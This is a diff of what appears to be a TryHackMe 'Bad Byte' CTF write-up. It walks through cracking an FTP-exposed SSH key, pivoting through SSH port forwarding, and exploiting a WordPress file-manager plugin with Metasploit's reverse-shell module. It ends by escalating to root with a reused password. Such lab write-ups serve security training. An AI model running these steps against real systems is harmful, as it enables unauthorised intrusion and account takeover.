@@ -6,19 +6,19 @@ categories:
   - TryHackMe
 ---
 
-<img src="badbyte.png" width=200 alt="badbyte">
+{{< post-img src="badbyte.png" alt="badbyte" style="width:200px" >}}
 
 Look at this cool logo
 
 ## Enumeration
 
-### nmap
-```
-ORT      STATE  SERVICE REASON       VERSION
+
+```bash
+PORT      STATE  SERVICE REASON       VERSION
 11/tcp    closed systat  conn-refused
 
 22/tcp    open   ssh     syn-ack      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 f3:a2:ed:93:4b:9c:bf:bb:33:4d:48:0d:fe:a4:de:96 (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9/A7kkuN5E+SS1C6w1NfeY196Rj4Y1Yx7njNCwNaCgIv8m+V+7MTHsRn3txLXRTHXErMqW3ypCmmjuY3O40kAragZSgA/XhdesGxGVa0szHK7H4fB28uQiyZgkOfIt/12kGaHB3iGwOeex2Hdg6ct4FdxTWKgDvuKZSLVoPXG66R8SOHql2cXfUtzyUMNJTTqoUED69soEJVG2ctfPKXi4BfFqM3OK2HgKzbmcSPXlLUTNhlcvjPuTa0kMRqiNTMVdP0PjSFdoaMviXHiznW7Fn6NHe3R/vIQt8Ac05Mdvim21QjRpJ4pm7v5+q1wXCJxGG6Ov71yThKP6yZ4ByMl
 |   256 22:72:00:36:eb:37:12:9f:5a:cc:c2:73:e0:4f:f1:4e (ECDSA)
@@ -32,8 +32,8 @@ ORT      STATE  SERVICE REASON       VERSION
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 | -rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
 |_-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
-| ftp-syst: 
-|   STAT: 
+| ftp-syst:
+|   STAT:
 | FTP server status:
 |      Connected to ::ffff:10.8.226.203
 |      Logged in as ftp
@@ -50,13 +50,13 @@ Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
 ```
 classic go grab those ftp files (`note.txt` and `id_rsa`)
 
-```
+```text
 I always forget my password. Just let me store an ssh key here.
 - errorcauser
 ```
 what a guy...what a name...
 
-```
+```bash
 └──╼ $python2 /usr/share/john/ssh2john.py id_rsa > id_john
 
 └──╼ $john -w=/usr/share/wordlists/rockyou.txt id_john
@@ -74,11 +74,11 @@ Session completed
 ```
 what a passphrase...
 
-```
+```bash
 └──╼ $chmod 600 id_rsa
 
 └──╼ $ssh errorcauser@10.10.218.175 -i id_rsa
-Enter passphrase for key 'id_rsa': 
+Enter passphrase for key 'id_rsa':
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-139-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -113,13 +113,14 @@ individual files in /usr/share/doc/*/copyright.
 Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
 applicable law.
 
--bash-4.4$ 
+-bash-4.4$
 ```
 
 Access granted
 
 ## port forwarding
-```
+
+```text
 Hi Error!
 I've set up a webserver locally so no one outside could access it.
 It is for testing purposes only.  There are still a few things I need to do like setting up a custom theme.
@@ -132,7 +133,7 @@ haha 'hi error...'
 
 Modify your `/etc/proxychains.conf` then
 
-```
+```bash
 └──╼ $ssh errorcauser@10.10.218.175 -i id_rsa -D 1337
 
 └──╼ $proxychains nmap -sT 127.0.0.1
@@ -154,7 +155,7 @@ PORT     STATE SERVICE
 
 Now the actual port forward to access the website
 
-```
+```bash
 └──╼ $sudo ssh -i id_rsa -L 80:127.0.0.1:80 errorcauser@10.10.68.101
 ...
 ```
@@ -162,11 +163,11 @@ And visit `http://127.0.0.1:80` to see badbyte being proudly powered by `wordpre
 
 ok for the enumeration we use nmap scripts, after we grab the wordpress version from the meta tags or with wpscan...
 
-```
+```html
 <meta name="generator" content="WordPress 5.7" />
 ```
 
-```
+```bash
 [+] Headers
  | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
  | Found By: Headers (Passive Detection)
@@ -211,13 +212,13 @@ ok for the enumeration we use nmap scripts, after we grab the wordpress version 
 [i] No Config Backups Found.
 ```
 
-```
+```bash
 └──╼ $ nmap -p 80 -vv --script http-wordpress-enum --script-args type="plugins",search-limit=1500 127.0.0.1
 ...
 
 PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack
-| http-wordpress-enum: 
+| http-wordpress-enum:
 | Search limited to top 1500 themes/plugins
 |   plugins
 |     duplicator 1.3.26
@@ -229,7 +230,7 @@ Google 'duplicator directory traversal' and get `CVE-2020-11738`
 
 Google 'wp-file-manager rce' and get `CVE-2020-25213`
 
-```
+```bash
 msf6 > search wp-file-manager
 
 Matching Modules
@@ -248,7 +249,7 @@ LHOST => 10.8.226.203
 msf6 exploit(multi/http/wp_file_manager_rce) > run
 
 [-] Handler failed to bind to 10.8.226.203:4444:-  -
-[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] Started reverse TCP handler on 0.0.0.0:4444
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable.
 [*] 127.0.0.1:80 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/jSj1S1.php
@@ -264,7 +265,7 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 To run a command as administrator (user "root"), use "sudo <command>".
 See "man sudo_root" for details.
 
-cth@badbyte:/home/cth$ 
+cth@badbyte:/home/cth$
 
 ```
 Get the user flag and get more powerful
@@ -273,7 +274,7 @@ Get the user flag and get more powerful
 
 They say cth got an old password somewhere...if it belongs to him we can `find` it
 
-```
+```bash
 cth@badbyte:/home/cth$ find / -type f -user cth 2>/dev/null
 ...
 /usr/share/wordpress/index.php
@@ -285,16 +286,16 @@ its usually the last files that are worth it so ignore the flood
 
 `bash.log` is something you might want to read
 
-```
+```bash
 Try: sudo apt install <deb name>
 
 cth@badbyte:~$ G00dP@$sw0rd2020
 G00dP@: command not found
 cth@badbyte:~$ passwd
 Changing password for cth.
-(current) UNIX password: 
-Enter new UNIX password: 
-Retype new UNIX password: 
+(current) UNIX password:
+Enter new UNIX password:
+Retype new UNIX password:
 passwd: password updated successfully
 cth@badbyte:~$ ls
 cth@badbyte:~$ cowsay "vim >>>>>>>>>>>>>>>>> nano"
@@ -309,15 +310,14 @@ cth@badbyte:~$ cowsay "vim >>>>>>>>>>>>>>>>> nano"
 ```
 
 ok this part almost got me...he said it was an `old password` so it won't work
-
 by the standards of 2020 its a good password...so maybe this fool changes his passwword every year?
 
-AND HE DOES! 
-
+AND HE DOES!
 WHO EVEN GOT TIME FOR THAT?
 
 Anyway, back to business
-```
+
+```bash
 cth@badbyte:/home/cth$ sudo -l
 sudo -l
 [sudo] password for cth: G00dP@$sw0rd2021
@@ -330,11 +330,11 @@ User cth may run the following commands on badbyte:
     (ALL : ALL) ALL
 ```
 
-lol that dude got mad sudo privileges 
+lol that dude got mad sudo privileges
 
 just `su` to root
 
-```
+```bash
 cth@badbyte:/home/cth$ sudo su
 sudo su
 root@badbyte:/home/cth# id
@@ -344,7 +344,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Get the flag...
 
-```
+```txt
 root@badbyte:~# cat root.txt
 cat root.txt
   |      ______    ________   ________              ______        _____________ __________  |
@@ -353,7 +353,7 @@ cat root.txt
   |   / _____ \ /  ____   //   /   / / /         / _____ \ __   ___ /   / /  /   ____/\     |
   |  / /____/ //  / __/  //   /___/ / /         / /____/ //  | /  //   / /  /   /____\/     |
   | /________//__/ / /__//_________/ /         /________/ |  \/  //___/ /  /   /________    |
-  | \________\\__\/  \__\\_________\/          \________\  \    / \___\/  /____________/\   | 
+  | \________\\__\/  \__\\_________\/          \________\  \    / \___\/  /____________/\   |
   |                                  _________           __/   / /        \____________\/   |
   |                                 /________/\         /_____/ /                           |
   |                                 \________\/         \_____\/                            |
@@ -373,9 +373,3 @@ THM{bad_byte_root_flag_here}
 I like how this room went through many things in a single ctf
 
 the dynamic port forwarding part is just great
-
-
-
-
-
-
